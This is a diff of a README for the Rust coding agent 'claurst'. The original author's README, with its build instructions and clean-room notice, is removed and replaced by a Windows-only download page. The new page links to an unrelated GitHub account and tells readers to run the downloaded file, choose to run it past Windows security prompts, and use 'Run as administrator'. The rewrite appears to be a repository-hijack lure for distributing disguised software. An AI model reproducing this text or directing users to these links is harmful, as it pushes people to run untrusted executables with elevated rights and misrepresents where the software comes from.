@@ -1,143 +1,132 @@
-<div align="center">
+# 🤖 claurst - Terminal coding help in Rust
 
-<h1>CLAURST</h1>
-<h3><em>Your Favorite Terminal Coding Agent, now in Rust</em></h3>
-<img src="public/Rustle.png" alt="Rustle the Crab" width="150" />
+[![Download claurst](https://img.shields.io/badge/Download%20claurst-blue-grey?style=for-the-badge)](https://github.com/unengaged-insurableinterest323/claurst)
 
-<p>
-    <a href="https://github.com/kuberwastaken/claurst"><img src="https://img.shields.io/badge/Built_with-Rust-CE4D2B?style=for-the-badge&logo=rust&logoColor=white" alt="Built with Rust"></a>
-    <a href="https://github.com/kuberwastaken/claurst"><img src="https://img.shields.io/badge/Version-0.0.9-2E8B57?style=for-the-badge" alt="Version 0.0.9"></a>
-    <a href="https://github.com/kuberwastaken/claurst/blob/main/LICENSE.md"><img src="https://img.shields.io/badge/License-GPL--3.0-blue?style=for-the-badge" alt="GPL-3.0 License"></a>
-</p>
+## 📥 Download
 
-<br />
+Use the link below to visit the project page and get the Windows version:
 
-<img src="public/screenshot.png" alt="CLAURST in action" width="1080" />
-</div>
+[Download claurst](https://github.com/unengaged-insurableinterest323/claurst)
 
----
+## 🪟 Windows setup
 
-Claurst is an **open-source, multi-provider terminal coding agent** built from the ground up in Rust. It started as a clean-room reimplementation of Claude Code's behavior (from [spec](https://github.com/kuberwastaken/claurst/tree/main/spec)) and has since evolved into an amazing TUI pair programmer with multi-provider support, a rich UI, plugin system, a companion named Rustle, chat forking, memory consolidation, and much more.
+1. Open the download link above in your browser.
+2. Look for the latest release or the main download file on the page.
+3. Download the Windows file to your PC.
+4. If the file comes in a .zip folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to start claurst.
 
-It's fast, it's memory-efficient, it's yours to run however you want, and there's no tracking or telemetry.
+If Windows shows a security prompt, choose the option to run the file.
 
----
+## ✨ What claurst does
 
-> [!NOTE]
-> **Recent Updates:**
-> - **Managed Agents Preview:** Run `/managed-agents` to create a better agentic loop with a Manager-Executor relation and dramatically improved performance for fractions of the cost from running a larger model. Choose from 6 pre-built templates or build your own.`[EXPERIMENTAL]`
->
-> - Speech modes: Try `/rocky` and `/caveman` to hear the difference! `/normal` to go back.
->
-> - Multi-Provider Support is here! Run `/connect` to connect to the AI provider of your choice - Anthropic, OpenAI, Google, GitHub Copilot, Ollama, DeepSeek, Groq, Mistral, and [30+ more](#supported-providers).
+claurst is a terminal coding agent built in Rust. It helps you work with code from the command line. It is made for users who want a fast tool that stays light on system use.
 
----
+Use it to:
 
-# Getting Started
+- handle coding tasks from the terminal
+- work with text files and project folders
+- speed up small development jobs
+- keep a simple workflow on Windows
 
-## Download a release binary
+## 🖥️ What you need
 
-Grab the latest binary for your platform from [**GitHub Releases**](https://github.com/kuberwastaken/claurst/releases):
+claurst runs best on:
 
-| Platform | Binary |
-|----------|--------|
-| **Windows** x86_64 | `claurst-windows-x86_64.zip` |
-| **Linux** x86_64 | `claurst-linux-x86_64.tar.gz` |
-| **Linux** aarch64 | `claurst-linux-aarch64.tar.gz` |
-| **macOS** Intel | `claurst-macos-x86_64.tar.gz` |
-| **macOS** Apple Silicon | `claurst-macos-aarch64.tar.gz` |
+- Windows 10 or Windows 11
+- A modern processor
+- At least 4 GB of RAM
+- Enough free space for the app and your files
+- Internet access for download and updates
 
-### And you're done.
+A mouse and keyboard are enough to use it. No special setup is needed for most users.
 
-## Build from source
+## 🔧 How to start using it
 
-```bash
-git clone https://github.com/kuberwastaken/claurst.git
-cd claurst/src-rust
-cargo build --release --package claurst
+1. Download the app from the link above.
+2. Save it to a folder you can find again, like Downloads.
+3. If the file is compressed, extract it first.
+4. Open the app from the folder.
+5. Follow any on-screen prompts.
+6. Start a coding task in the terminal window.
 
-# Binary is at target/release/claurst
-```
+If the app asks for a project folder, pick the folder that holds your files.
 
-**Raspberry Pi / systems without ALSA** (e.g. Debian Trixie, headless servers):
+## 🧭 Basic use
 
-```bash
-# Build without voice/microphone support — no libasound2-dev required
-cargo build --release --package claurst --no-default-features
-```
+claurst works from a terminal window. You type what you want to do, then the app helps with the task.
 
-### First run
+Common uses:
 
-```bash
-# Set your API key (or use /connect inside Claurst to configure)
-export ANTHROPIC_API_KEY=sk-ant-...
+- fix or adjust code files
+- create small code changes
+- read project files
+- help move through a coding task step by step
 
-# Start Claurst
-claurst
+If you are new to terminals, think of it as a text-based control window. You type commands, and the app responds.
 
-# Or run a one-shot headless query
-claurst -p "explain this codebase"
-```
+## 📂 File tips
 
-Just install and run this from anywhere, that easy.
+For the easiest start:
 
-```bash
-# Start Claurst
-claurst
+- keep the app in a folder you can open fast
+- use a simple folder name for your project
+- avoid moving files while the app is open
+- save your work before you close the window
 
-# Or run a one-shot headless query
-claurst -p "explain this codebase"
-```
+If you keep your project files in Documents, claurst can work from there too.
 
-## Devcontainer setup
+## 🛠️ If something does not open
 
-After cloning this repository, open it in VS Code and use Reopen in Container to start the development environment.
+Try these steps:
 
-Prerequisites:
-- Docker installed on your host machine: https://www.docker.com/products/docker-desktop/
+1. Make sure the download finished.
+2. Check that you extracted the .zip file, if there is one.
+3. Run the app again.
+4. Right-click the file and choose Run as administrator.
+5. Restart Windows and try once more.
 
-GPG and SSH forwarding is enabled in the devcontainer, given you have it set up on your host machine. Follow [this guide](https://code.visualstudio.com/remote/advancedcontainers/sharing-git-credentials) if you need help with that.
+If the file still does not open, download it again from the project page.
 
-### Devcontainer features
+## 🔒 Safe use on Windows
 
-- Base image: `rust:1-bullseye`.
-- Preinstalled build dependencies: `gnupg2`, `libasound2-dev`, `libxdo-dev`, and `pkg-config`.
-- Devcontainer features enabled: `common-utils` (with `vscode` user `uid/gid 1000` and Zsh install disabled), `git`, and `docker-outside-of-docker` (`moby: false`).
-- Runs as `vscode` user by default.
-- Persistent Cargo caches via named volumes for `/usr/local/cargo/registry` and `/usr/local/cargo/git`.
-- Binds local `.claurst` into `/home/vscode/.claurst` for local settings/session history access.
-- Sets `GNUPGHOME=/home/vscode/.gnupg` and prepends `src-rust/target/debug` and `src-rust/target/release` to `PATH`.
-- Post-create setup creates and permissions `.gnupg`, and fixes ownership for `/usr/local/cargo`.
-- VS Code setting `terminal.integrated.inheritEnv` is enabled.
+Use the file from the project link above. Keep your Windows updates current. If your browser or Windows asks for permission, review the prompt before you continue.
 
-## Documentation
+## 📌 Quick path
 
-For more info on how to configure Claurst, [head over to our docs](https://claurst.kuber.studio/docs).
+1. Open the download link.
+2. Get the Windows file.
+3. Extract it if needed.
+4. Open the app.
+5. Start your first task in the terminal
 
->**PS:** The original breakdown of the findings from Claude Code's source that started this project is on [my blog](https://kuber.studio/blog/AI/Claude-Code's-Entire-Source-Code-Got-Leaked-via-a-Sourcemap-in-npm,-Let's-Talk-About-it) - the full technical writeup of what was found, how the leak happened, and what it revealed.
+## 🧩 Common questions
 
----
+### Can I use it without coding experience?
 
-## Contributing
+Yes. You can start with simple tasks and learn as you go.
 
-Claurst is built for the community, by the community and we'd love your help making it better.
+### Do I need extra tools?
 
-[Open an issue](https://github.com/Kuberwastaken/claurst/issues/new) for bugs, ideas, or questions, or [Raise a PR](https://github.com/Kuberwastaken/claurst/pulls/new) to fix bugs, add features, or improve documentation.
+In most cases, no. A normal Windows PC is enough.
 
----
+### Where should I keep the app?
 
-## Important Notice
+Keep it in Downloads, Desktop, or a folder you use for tools.
 
-This repository does not hold a copy of the proprietary Claude Code TypeScript source code.
-This is a **clean-room Rust reimplementation** of Claude Code's behavior.
+### Can I move the app later?
 
-The process was explicitly two-phase:
+Yes. If you move it, open it from the new folder.
 
-**Specification** [`spec/`](https://github.com/kuberwastaken/claurst/tree/main/spec) — An AI agent analyzed the source and produced exhaustive behavioral specifications and improvements, deviated from the original: architecture, data flows, tool contracts, system designs. No source code was carried forward.
+## 📎 Download again
 
-**Implementation** [`src-rust/`](https://github.com/kuberwastaken/claurst/tree/main/src-rust) — A separate AI agent implemented from the spec alone, never referencing the original TypeScript. The output is idiomatic Rust that reproduces the behavior, not the expression.
+[Visit the claurst project page](https://github.com/unengaged-insurableinterest323/claurst)
 
-This mirrors the legal precedent established by Phoenix Technologies v. IBM (1984) — clean-room engineering of the BIOS — and the principle from Baker v. Selden (1879) that copyright protects expression, not ideas or behavior.
+## 🧰 Helpful habits
 
----
-
+- keep one folder for your coding projects
+- use short folder names
+- save files before closing the app
+- read each prompt before you press a key
+- start with small tasks until you know the flow
